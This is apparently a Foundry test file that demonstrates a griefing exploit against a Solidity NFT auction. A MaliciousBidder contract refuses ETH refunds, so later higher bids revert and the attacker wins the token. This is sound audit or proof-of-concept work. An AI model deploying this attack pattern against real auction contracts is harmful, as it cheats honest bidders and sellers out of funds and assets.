// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {CairoAuction} from "../src/CairoAuction.sol";

interface IERC721Receiver {
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4);
}

contract CairoAuctionTest is Test {
    CairoAuction public auction;
    MockNFT public nft;

    address public seller = makeAddr("seller");
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");

    uint256 public constant TOKEN_ID = 1;
    uint256 public constant BIDDING_TIME = 1 days;

    function setUp() public {
        // Seller owns the trophy NFT.
        nft = new MockNFT();
        nft.mint(seller, TOKEN_ID);

        // Seller deploys the auction and escrows the trophy into it.
        vm.startPrank(seller);
        auction = new CairoAuction(address(nft), TOKEN_ID, BIDDING_TIME);
        nft.safeTransferFrom(seller, address(auction), TOKEN_ID);
        vm.stopPrank();

        assertEq(
            nft.ownerOf(TOKEN_ID),
            address(auction),
            "trophy not escrowed"
        );

        // Fund bidders.
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
    }

    function test_AttackerWinAuction() public {
        // user1 (honest EOA) opens the bidding.
        address user1 = makeAddr("user1");
        vm.deal(user1, 10 ether);
        vm.prank(user1);
        auction.bid{value: 1 ether}();
        assertEq(auction.highestBidder(), user1);

        // user2 is a contract that rejects ETH but accepts NFTs. It outbids
        // user1 (refunding the EOA is fine).
        MaliciousBidder user2 = new MaliciousBidder(auction);
        vm.deal(address(user2), 10 ether);
        user2.attack(2 ether);
        assertEq(auction.highestBidder(), address(user2));

        // user3 (honest EOA) tries to outbid, but refunding user2 reverts,
        // so the whole bid reverts. user3 can never win.
        address user3 = makeAddr("user3");
        vm.deal(user3, 10 ether);
        vm.prank(user3);
        vm.expectRevert("Transaction Failed");
        auction.bid{value: 3 ether}();

        // Auction ends with the malicious contract still on top.
        assertEq(auction.highestBidder(), address(user2));
        assertEq(auction.highestBid(), 2 ether);

        vm.warp(block.timestamp + BIDDING_TIME);
        auction.end();

        // The griefer permanently wins the trophy despite user3's higher offer.
        assertEq(nft.ownerOf(TOKEN_ID), address(user2), "griefer did not win");
    }
}

/// @dev A bidder that accepts the NFT but reverts on any plain ETH transfer,
///      making it impossible to refund once it becomes the highest bidder.
contract MaliciousBidder {
    CairoAuction public immutable auction;

    constructor(CairoAuction _auction) {
        auction = _auction;
    }

    function attack(uint256 amount) external {
        auction.bid{value: amount}();
    }

    // Accept the trophy so end() can deliver it.
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    // No receive()/payable fallback: any refund attempt reverts.
}

/// @dev Minimal ERC721 mock — enough surface for the auction to escrow and
///      deliver a single trophy token. Not a full spec implementation.
contract MockNFT {
    mapping(uint256 => address) public ownerOf;

    function mint(address to, uint256 tokenId) external {
        ownerOf[tokenId] = to;
    }

    function transferFrom(address from, address to, uint256 tokenId) public {
        require(ownerOf[tokenId] == from, "Not owner");
        ownerOf[tokenId] = to;
    }

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external {
        transferFrom(from, to, tokenId);
        if (to.code.length > 0) {
            bytes4 ret = IERC721Receiver(to).onERC721Received(
                msg.sender,
                from,
                tokenId,
                ""
            );
            require(
                ret == IERC721Receiver.onERC721Received.selector,
                "Unsafe recipient"
            );
        }
    }
}
